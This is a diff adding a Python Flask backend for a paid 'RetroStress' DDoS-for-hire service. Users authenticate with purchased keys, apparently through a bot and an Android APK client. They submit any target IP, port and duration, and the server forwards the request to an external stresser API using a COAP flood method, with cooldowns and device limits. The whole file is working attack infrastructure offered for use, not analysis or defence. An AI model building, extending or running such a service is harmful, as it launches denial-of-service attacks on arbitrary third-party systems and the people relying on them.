@@ -1,0 +1,476 @@
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+import requests
+import time
+import os
+import threading
+import gc
+from datetime import datetime
+from pymongo import MongoClient
+from dotenv import load_dotenv
+
+load_dotenv()
+
+app = Flask(__name__)
+CORS(app)
+
+# ========== FORCE LOGGING ==========
+def log(msg, level="INFO"):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print(f"[{level}][{timestamp}] {msg}", flush=True)
+
+# ========== READ FROM ENVIRONMENT VARIABLES ==========
+RETROSTRESS_API_URL = os.environ.get('RETROSTRESS_API_URL')
+RETROSTRESS_API_KEY = os.environ.get('RETROSTRESS_API_KEY')
+MONGODB_URI = os.environ.get('MONGODB_URI')
+DATABASE_NAME = os.environ.get('DATABASE_NAME')
+
+if not RETROSTRESS_API_URL:
+    log("❌ ERROR: RETROSTRESS_API_URL not set!", "ERROR")
+    exit(1)
+
+if not RETROSTRESS_API_KEY:
+    log("❌ ERROR: RETROSTRESS_API_KEY not set!", "ERROR")
+    exit(1)
+
+if not MONGODB_URI:
+    log("❌ ERROR: MONGODB_URI not set!", "ERROR")
+    exit(1)
+
+log(f"📋 RetroStress API URL: {RETROSTRESS_API_URL}")
+
+# ========== MONGODB CONNECTION ==========
+try:
+    client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
+    client.admin.command('ping')
+    db = client[DATABASE_NAME]
+    keys_collection = db.keys
+    active_sessions_collection = db.active_sessions
+    settings_collection = db.settings
+    log("✅ MongoDB connected successfully!")
+except Exception as e:
+    log(f"❌ MongoDB connection failed: {e}", "ERROR")
+    exit(1)
+
+# ========== SETTINGS MANAGEMENT ==========
+MIN_ATTACK_TIME = 1
+
+def get_setting(setting_key, default_value):
+    try:
+        setting = settings_collection.find_one({"setting_key": setting_key})
+        if setting:
+            return setting.get("setting_value", default_value)
+    except Exception as e:
+        log(f"⚠️ Failed to get setting {setting_key}: {e}", "WARNING")
+    return default_value
+
+def get_max_duration():
+    return get_setting("max_duration", 240)
+
+def get_cooldown_seconds():
+    return get_setting("cooldown_seconds", 60)
+
+# ========== SERVER IP ==========
+def get_server_ip():
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text.strip()
+        return ip if ip else "Unknown"
+    except:
+        try:
+            ip = requests.get('https://ifconfig.me', timeout=5).text.strip()
+            return ip if ip else "Unknown"
+        except:
+            return "Unknown"
+
+# ========== IN-MEMORY STORAGE WITH LOCKS ==========
+cooldowns = {}
+active_attacks = {}
+cooldowns_lock = threading.Lock()
+active_attacks_lock = threading.Lock()
+
+def verify_key(key, device_id):
+    try:
+        key_data = keys_collection.find_one({"key": key, "is_active": 1})
+        
+        if not key_data:
+            return {"valid": False, "reason": "Key not found"}
+            
+        if not key_data.get('is_redeemed', 0):
+            return {"valid": False, "reason": "Key must be redeemed in bot first"}
+        
+        expiry_ts = key_data.get('expiry_at', 0)
+        device_limit = key_data.get('device_limit', 1)
+        now = int(time.time() * 1000)
+        
+        if expiry_ts < now:
+            return {"valid": False, "reason": "Key expired"}
+        
+        session = active_sessions_collection.find_one({"key": key})
+        current_devices = session.get('devices', {}) if session else {}
+        active_count = len(current_devices) if isinstance(current_devices, dict) else 0
+        
+        if device_id not in current_devices:
+            if active_count >= device_limit:
+                return {"valid": False, "reason": f"Device limit reached ({device_limit})"}
+        
+        if not session:
+            active_sessions_collection.insert_one({
+                "key": key,
+                "devices": {device_id: {"login_time": now, "last_active": now}}
+            })
+        else:
+            devices = session.get('devices', {})
+            devices[device_id] = {"login_time": now, "last_active": now}
+            active_sessions_collection.update_one(
+                {"key": key},
+                {"$set": {"devices": devices}}
+            )
+        
+        if key_data.get('is_used') == 0:
+            keys_collection.update_one(
+                {"key": key},
+                {"$set": {"is_used": 1, "used_by": device_id, "used_at": now}}
+            )
+        
+        return {"valid": True, "expiry": expiry_ts}
+        
+    except Exception as e:
+        log(f"❌ verify_key error: {e}", "ERROR")
+        return {"valid": False, "reason": "Internal verification error"}
+
+def check_cooldown(device_id):
+    try:
+        cooldown_seconds = get_cooldown_seconds()
+        if cooldown_seconds == 0:
+            return {"can_attack": True}
+        
+        now = time.time()
+        with cooldowns_lock:
+            if device_id in cooldowns:
+                expiry = cooldowns[device_id]
+                if isinstance(expiry, (int, float)) and now < expiry:
+                    remaining = int(expiry - now)
+                    return {"can_attack": False, "remaining": remaining}
+                elif not isinstance(expiry, (int, float)):
+                    del cooldowns[device_id]
+        return {"can_attack": True}
+    except Exception as e:
+        log(f"⚠️ check_cooldown error: {e}", "WARNING")
+        return {"can_attack": True}
+
+def set_cooldown(device_id):
+    try:
+        cooldown_seconds = get_cooldown_seconds()
+        if cooldown_seconds > 0:
+            with cooldowns_lock:
+                cooldowns[device_id] = time.time() + cooldown_seconds
+    except Exception as e:
+        log(f"⚠️ set_cooldown error: {e}", "WARNING")
+
+def check_active_attack(device_id):
+    try:
+        with active_attacks_lock:
+            if device_id in active_attacks:
+                expiry = active_attacks[device_id]
+                if isinstance(expiry, (int, float)) and expiry > time.time():
+                    return {"can_attack": False}
+                elif not isinstance(expiry, (int, float)):
+                    del active_attacks[device_id]
+        return {"can_attack": True}
+    except Exception as e:
+        log(f"⚠️ check_active_attack error: {e}", "WARNING")
+        return {"can_attack": True}
+
+def start_attack(device_id, duration):
+    try:
+        with active_attacks_lock:
+            active_attacks[device_id] = time.time() + duration
+        
+        def cleanup():
+            try:
+                time.sleep(duration)
+                with active_attacks_lock:
+                    if device_id in active_attacks:
+                        del active_attacks[device_id]
+            except Exception as e:
+                log(f"⚠️ cleanup error: {e}", "WARNING")
+        
+        threading.Thread(target=cleanup, daemon=True).start()
+    except Exception as e:
+        log(f"⚠️ start_attack error: {e}", "WARNING")
+
+# ========== PERIODIC CLEANUP ==========
+def cleanup_memory():
+    while True:
+        try:
+            time.sleep(30)
+            now = time.time()
+            cleaned_count = 0
+            
+            with cooldowns_lock:
+                expired_cooldowns = [did for did, expiry in cooldowns.items() 
+                                    if isinstance(expiry, (int, float)) and expiry <= now]
+                for did in expired_cooldowns:
+                    del cooldowns[did]
+                    cleaned_count += 1
+            
+            with active_attacks_lock:
+                expired_attacks = [did for did, expiry in active_attacks.items()
+                                  if isinstance(expiry, (int, float)) and expiry <= now]
+                for did in expired_attacks:
+                    del active_attacks[did]
+                    cleaned_count += 1
+            
+            if cleaned_count > 0:
+                log(f"🧹 Cleaned {cleaned_count} expired entries")
+            
+            gc.collect()
+                    
+        except Exception as e:
+            log(f"⚠️ Cleanup error: {e}", "WARNING")
+
+cleanup_thread = threading.Thread(target=cleanup_memory, daemon=True)
+cleanup_thread.start()
+log("✅ Cleanup thread started")
+
+# ========== AFTER REQUEST CLEANUP ==========
+@app.after_request
+def after_request(response):
+    gc.collect()
+    return response
+
+# ========== API ENDPOINTS ==========
+
+@app.route('/')
+def home():
+    return jsonify({
+        "status": "online",
+        "service": "RetroStress API Server",
+        "endpoints": [
+            "/api/verify-key",
+            "/api/attack",
+            "/api/logout",
+            "/api/settings",
+            "/api/rules",
+            "/api/ip",
+            "/health"
+        ]
+    }), 200
+
+@app.route('/health')
+def health():
+    return "OK", 200
+
+@app.route('/api/verify-key', methods=['POST'])
+def verify_key_endpoint():
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"success": False, "reason": "Invalid JSON"}), 400
+        
+        key = data.get('key')
+        device_id = data.get('device_id')
+        
+        result = verify_key(key, device_id)
+        
+        if result["valid"]:
+            return jsonify({"success": True, "expiry": result["expiry"]})
+        else:
+            return jsonify({"success": False, "reason": result["reason"]}), 401
+    except Exception as e:
+        log(f"❌ Verify error: {e}", "ERROR")
+        return jsonify({"success": False, "reason": str(e)}), 500
+
+@app.route('/api/attack', methods=['POST'])
+def attack_endpoint():
+    start_time = time.time()
+    
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"success": False, "reason": "Invalid JSON"}), 400
+        
+        key = data.get('key')
+        device_id = data.get('device_id')
+        ip = data.get('ip')
+        port = data.get('port')
+        duration = data.get('duration')
+        
+        device_id_short = device_id[:8] if device_id else "unknown"
+        log(f"🔵 Attack - Device: {device_id_short}... | Target: {ip}:{port} | Duration: {duration}s")
+        
+        if not all([key, device_id, ip, port, duration]):
+            return jsonify({"success": False, "reason": "Missing parameters"}), 400
+        
+        try:
+            duration = int(duration)
+            max_duration = get_max_duration()
+            if duration < MIN_ATTACK_TIME or duration > max_duration:
+                return jsonify({"success": False, "reason": f"Duration must be {MIN_ATTACK_TIME}-{max_duration} seconds"}), 400
+        except:
+            return jsonify({"success": False, "reason": "Invalid duration"}), 400
+        
+        # Validate IP
+        parts = ip.split('.')
+        if len(parts) != 4:
+            return jsonify({"success": False, "reason": "Invalid IP address"}), 400
+        for part in parts:
+            if not part.isdigit() or int(part) < 0 or int(part) > 255:
+                return jsonify({"success": False, "reason": "Invalid IP address"}), 400
+        
+        # Validate port
+        try:
+            port = int(port)
+            if port < 1 or port > 65535:
+                return jsonify({"success": False, "reason": "Port must be 1-65535"}), 400
+        except:
+            return jsonify({"success": False, "reason": "Invalid port"}), 400
+        
+        # Verify key
+        key_result = verify_key(key, device_id)
+        if not key_result["valid"]:
+            log(f"❌ Key verification failed: {key_result['reason']}")
+            return jsonify({"success": False, "reason": key_result["reason"]}), 401
+        
+        # Check active attack
+        if not check_active_attack(device_id)["can_attack"]:
+            log(f"❌ Active attack already running")
+            return jsonify({"success": False, "reason": "You already have an attack running"}), 429
+        
+        # Check cooldown
+        cooldown_check = check_cooldown(device_id)
+        if not cooldown_check["can_attack"]:
+            remaining = cooldown_check.get('remaining', 0)
+            log(f"❌ Cooldown active: {remaining}s remaining")
+            return jsonify({"success": False, "reason": f"Cooldown: Wait {remaining} seconds"}), 429
+        
+        try:
+            # Call RetroStress API
+            url = RETROSTRESS_API_URL
+            
+            # Check if URL is a template with placeholders
+            if "[target]" in url or "[port]" in url or "[time]" in url:
+                log("ℹ️ URL appears to be a template. Replacing placeholders.")
+                url = url.replace("[target]", ip)\
+                         .replace("[port]", str(port))\
+                         .replace("[time]", str(duration))\
+                         .replace("[method]", "COAP")
+                
+                if "key=0" in url and RETROSTRESS_API_KEY:
+                    url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
+                    
+                log(f"🔵 Calling RetroStress API: {url}")
+                response = requests.get(url, timeout=30)
+            else:
+                # Fallback to standard params if no placeholders
+                params = {
+                    "key": RETROSTRESS_API_KEY,
+                    "host": ip, # Use host instead of target as indicated by template
+                    "port": port,
+                    "time": duration,
+                    "method": "COAP",
+                    "concurrent": 1
+                }
+                log(f"🔵 Calling RetroStress API: {RETROSTRESS_API_URL} with params")
+                response = requests.get(RETROSTRESS_API_URL, params=params, timeout=30)
+            elapsed = time.time() - start_time
+            
+            if response.status_code == 200 or response.status_code == 201:
+                start_attack(device_id, duration)
+                set_cooldown(device_id)
+                log(f"✅ Attack SUCCESS | Time: {elapsed:.2f}s")
+                return jsonify({
+                    "success": True, 
+                    "message": f"💥 Attack started on {ip}:{port} for {duration} seconds",
+                    "duration": duration
+                }), 200
+            else:
+                log(f"❌ RetroStress API returned {response.status_code}")
+                log(f"   Response: {response.text[:200]}")
+                return jsonify({"success": False, "reason": f"API error: {response.status_code}"}), response.status_code
+                
+        except requests.exceptions.Timeout:
+            elapsed = time.time() - start_time
+            log(f"⏰ API TIMEOUT after {elapsed:.2f}s", "ERROR")
+            return jsonify({"success": False, "reason": "API timeout"}), 504
+            
+        except requests.exceptions.ConnectionError as e:
+            elapsed = time.time() - start_time
+            log(f"🔌 API CONNECTION ERROR after {elapsed:.2f}s: {e}", "ERROR")
+            return jsonify({"success": False, "reason": "Cannot connect to API"}), 503
+            
+    except Exception as e:
+        elapsed = time.time() - start_time
+        log(f"💥 UNEXPECTED ERROR after {elapsed:.2f}s: {type(e).__name__}: {e}", "ERROR")
+        import traceback
+        traceback.print_exc()
+        return jsonify({"success": False, "reason": "Internal server error"}), 500
+
+@app.route('/api/logout', methods=['POST'])
+def logout_endpoint():
+    try:
+        data = request.get_json()
+        key = data.get('key')
+        device_id = data.get('device_id')
+        
+        session = active_sessions_collection.find_one({"key": key})
+        if session:
+            devices = session.get('devices', {})
+            if device_id and device_id in devices:
+                del devices[device_id]
+                if devices:
+                    active_sessions_collection.update_one(
+                        {"key": key},
+                        {"$set": {"devices": devices}}
+                    )
+                else:
+                    active_sessions_collection.delete_one({"key": key})
+        
+        return jsonify({"success": True})
+    except Exception as e:
+        log(f"❌ Logout error: {e}", "ERROR")
+        return jsonify({"success": False, "reason": str(e)}), 500
+
+@app.route('/api/settings', methods=['GET'])
+def get_settings_endpoint():
+    """Endpoint for APK to get attack settings"""
+    return jsonify({
+        "min_attack": MIN_ATTACK_TIME,
+        "max_attack": get_max_duration(),
+        "cooldown": get_cooldown_seconds()
+    })
+
+@app.route('/api/rules', methods=['GET'])
+def rules_endpoint():
+    """Endpoint for APK to get attack rules"""
+    return jsonify({
+        "min_attack": MIN_ATTACK_TIME,
+        "max_attack": get_max_duration(),
+        "cooldown": get_cooldown_seconds(),
+        "status": "online"
+    })
+
+@app.route('/api/ip', methods=['GET'])
+def get_ip_endpoint():
+    ip = get_server_ip()
+    return jsonify({
+        "server_ip": ip,
+        "status": "online",
+        "timestamp": int(time.time())
+    })
+
+# ========== START SERVER (when run directly) ==========
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5001))
+    server_ip = get_server_ip()
+    print("=" * 60)
+    print("⚡ RETROSTRESS API SERVER STARTING...")
+    print("=" * 60)
+    print(f"🖥️ Server IP: {server_ip}")
+    print(f"🎯 RetroStress API: {RETROSTRESS_API_URL}")
+    print(f"🔑 API Key: {RETROSTRESS_API_KEY[:10]}...")
+    print(f"⚙️ Attack Range: {MIN_ATTACK_TIME}-{get_max_duration()} seconds")
+    print(f"⏳ Cooldown: {get_cooldown_seconds()} seconds per user")
+    print(f"📡 Endpoints: /api/settings, /api/rules, /api/attack, /api/verify-key")
+    print("=" * 60)
+    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
